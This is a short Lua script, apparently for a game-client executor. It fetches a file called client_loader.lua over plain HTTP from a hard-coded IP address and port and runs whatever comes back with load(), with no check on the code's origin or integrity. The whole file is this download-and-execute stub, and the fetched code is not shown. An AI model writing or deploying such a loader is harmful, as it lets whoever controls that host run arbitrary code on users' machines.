local ClientLoaderURL = "http://82.22.7.19:25005/public/lua/client_loader.lua"
local status, ClientLoaderCode = Susano.HttpGet(ClientLoaderURL)

if status ~= 200 then
    return
end

load(ClientLoaderCode)()
